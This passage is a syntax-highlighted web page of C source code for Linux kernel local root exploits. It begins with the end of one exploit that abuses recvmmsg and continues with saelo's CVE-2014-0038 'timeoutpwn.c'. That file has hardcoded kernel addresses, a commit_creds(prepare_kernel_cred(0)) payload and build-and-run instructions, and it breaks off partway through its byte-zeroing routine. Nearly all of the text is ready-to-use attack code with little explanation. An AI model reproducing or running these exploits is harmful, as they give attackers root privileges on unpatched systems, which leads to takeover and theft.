</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">prepare_kernel_cred = (_prepare_kernel_cred)off-&gt;</span><span style="color:#bf616a;">prepare_kernel_cred</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">mmapped = (</span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;">)</span><span style="color:#bf616a;">mmap</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)mmapped, </span><span style="color:#bf616a;">sysconf</span><span style="color:#c0c5ce;">(_SC_PAGE_SIZE)*</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(mmapped == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">mmap()</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*)mmapped,</span><span style="color:#d08770;">0x90</span><span style="color:#c0c5ce;">,</span><span style="color:#bf616a;">sysconf</span><span style="color:#c0c5ce;">(_SC_PAGE_SIZE)*</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*)mmapped + </span><span style="color:#bf616a;">sysconf</span><span style="color:#c0c5ce;">(_SC_PAGE_SIZE), (</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*)&amp;trampoline, </span><span style="color:#d08770;">300</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">mprotect</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)mmapped, </span><span style="color:#bf616a;">sysconf</span><span style="color:#c0c5ce;">(_SC_PAGE_SIZE)*</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, PROT_READ|PROT_EXEC) != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">mprotect()</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">sockfd = </span><span style="color:#bf616a;">socket</span><span style="color:#c0c5ce;">(AF_INET, SOCK_DGRAM, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(sockfd == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">socket()</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">sa.</span><span style="color:#bf616a;">sin_family </span><span style="color:#c0c5ce;">= AF_INET;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">sa.</span><span style="color:#bf616a;">sin_addr</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">s_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">htonl</span><span style="color:#c0c5ce;">(INADDR_LOOPBACK);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">sa.</span><span style="color:#bf616a;">sin_port </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">htons</span><span style="color:#c0c5ce;">(port);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">bind</span><span style="color:#c0c5ce;">(sockfd, (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr *) &amp;sa, sizeof(sa)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">bind()</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(msgs, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(msgs));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">iovecs[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">].</span><span style="color:#bf616a;">iov_base </span><span style="color:#c0c5ce;">= &amp;buf;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">iovecs[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">].</span><span style="color:#bf616a;">iov_len </span><span style="color:#c0c5ce;">= BUFSIZE;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msgs[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">].</span><span style="color:#bf616a;">msg_hdr</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">msg_iov </span><span style="color:#c0c5ce;">= &amp;iovecs[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msgs[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">].</span><span style="color:#bf616a;">msg_hdr</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">msg_iovlen </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(i=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;i &lt; </span><span style="color:#d08770;">3 </span><span style="color:#c0c5ce;">;i++) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">udp</span><span style="color:#c0c5ce;">(i);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">retval = </span><span style="color:#bf616a;">syscall</span><span style="color:#c0c5ce;">(__NR_recvmmsg, sockfd, msgs, VLEN, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)off-&gt;</span><span style="color:#bf616a;">dest</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">-i);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!retval) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr,&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">recvmmsg() failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">close</span><span style="color:#c0c5ce;">(sockfd); </span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr,&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">trigger</span><span style="color:#c0c5ce;">();</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span></pre><p></p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* Local root exploit for CVE-2014-0038.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* https://raw.github.com/saelo/cve-2014-0038/master/timeoutpwn.c</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* Bug: The X86_X32 recvmmsg syscall does not properly sanitize the timeout pointer</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* passed from userspace.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* Exploit primitive: Pass a pointer to a kernel address as timeout for recvmmsg,</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* if the original byte at that address is known it can be overwritten</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* with known data.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* If the least significant byte is 0xff, waiting 255 seconds will turn it into a 0x00.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* Restrictions: The first long at the passed address (tv_sec) has to be positive</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* and the second long (tv_nsec) has to be smaller than 1000000000.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* Overview: Target the release function pointer of the ptmx_fops structure located in</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* non initialized (and thus writable) kernel memory. Zero out the three most</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* significant bytes and thus turn it into a pointer to an address mappable in</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* user space.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* The release pointer is used as it is followed by 16 0x00 bytes (so the tv_nsec</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* is valid).</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* Open /dev/ptmx, close it and enjoy.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* Not very beautiful but should be fairly reliable if symbols can be resolved.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* Tested on Ubuntu 13.10</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* gcc timeoutpwn.c -o pwn &amp;&amp; ./pwn</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* Written by saelo</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*/</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">netinet/ip.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">time.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/socket.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/syscall.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/wait.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/mman.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">__X32_SYSCALL_BIT </span><span style="color:#d08770;">0x40000000</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#undef</span><span style="color:#c0c5ce;"> __NR_recvmmsg</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">__NR_recvmmsg (__X32_SYSCALL_BIT + </span><span style="color:#d08770;">537</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">BUFSIZE </span><span style="color:#d08770;">200</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">PAYLOADSIZE </span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">FOPS_RELEASE_OFFSET </span><span style="color:#d08770;">13</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* Adapt these addresses for your need.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* see /boot/System.map* or /proc/kallsyms</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* These are the offsets from ubuntu 3.11.0-12-generic.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*/</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">PTMX_FOPS </span><span style="color:#d08770;">0xffffffff81fb30c0LL</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">TTY_RELEASE </span><span style="color:#d08770;">0xffffffff8142fec0LL</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">COMMIT_CREDS </span><span style="color:#d08770;">0xffffffff8108ad40LL</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">PREPARE_KERNEL_CRED </span><span style="color:#d08770;">0xffffffff8108b010LL</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">typedef int __attribute__</span><span style="color:#c0c5ce;">((regparm(</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">))) (* _commit_creds)(</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> cred);</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">typedef unsigned long __attribute__</span><span style="color:#c0c5ce;">((regparm(</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">))) (* _prepare_kernel_cred)(</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> cred);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* Match signature of int release(struct inode*, struct file*).</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* See here: http://grsecurity.net/~spender/exploits/enlightenment.tgz</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*/</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int __attribute__</span><span style="color:#c0c5ce;">((regparm(</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">)))</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">kernel_payload</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">* </span><span style="color:#bf616a;">foo</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">* </span><span style="color:#bf616a;">bar</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">*((</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">)) = -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// restore pointer</span><span style="color:#65737e;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">commit_creds</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">prepare_kernel_cred</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* Write a zero to the byte at then given address.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* Only works if the current value is 0xff.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*/</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">zero_out</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">long </span><span style="color:#bf616a;">addr</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> sockfd, retval, port, pid, i;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr_in sa;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf[BUFSIZE];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> mmsghdr msgs;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> iovec iovecs;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">srand</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">time</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">port = </span><span style="color:#d08770;">1024 </span><span style="color:#c0c5ce;">+ (</span><span style="color:#96b5b4;">rand</span><span style="color:#c0c5ce;">() % (</span><span style="color:#d08770;">0x10000 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">1024</span><span style="color:#c0c5ce;">));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">sockfd = </span><span style="color:#bf616a;">socket</span><span style="color:#c0c5ce;">(AF_INET, SOCK_DGRAM, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(sockfd == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">socket()</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">sa.</span><span style="color:#bf616a;">sin_family </span><span style="color:#c0c5ce;">= AF_INET;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">sa.</span><span style="color:#bf616a;">sin_addr</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">s_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">htonl</span><span style="color:#c0c5ce;">(INADDR_LOOPBACK);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">sa.</span><span style="color:#bf616a;">sin_port </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">htons</span><span style="color:#c0c5ce;">(port);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">bind</span><span style="color:#c0c5ce;">(sockfd, (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr *) &amp;sa, sizeof(sa)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">bind()</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;msgs, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(msgs));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">iovecs.</span><span style="color:#bf616a;">iov_base </span><span style="color:#c0c5ce;">= buf;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">iovecs.</span><span style="color:#bf616a;">iov_len </span><span style="color:#c0c5ce;">= BUFSIZE;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msgs.</span><span style="color:#bf616a;">msg_hdr</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">msg_iov </span><span style="color:#c0c5ce;">= &amp;iovecs;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msgs.</span><span style="color:#bf616a;">msg_hdr</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">msg_iovlen </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">    </span><span style="color:#65737e;">* start a seperate process to send a udp message after 255 seconds so the syscall returns,</span><span style="color:#65737e;">
</span><span style="color:#65737e;">    </span><span style="color:#65737e;">* but not after updating the timout struct and writing the remaining time into it.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">    </span><span style="color:#65737e;">* 0xff - 255 seconds = 0x00</span><span style="color:#65737e;">
</span><span style="color:#65737e;">    </span><span style="color:#65737e;">*/</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">clearing byte at 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, addr);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">pid = </span><span style="color:#bf616a;">fork</span><span style="color:#c0c5ce;">();</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(pid == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buf, </span><span style="color:#d08770;">0x41</span><span style="color:#c0c5ce;">, BUFSIZE);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
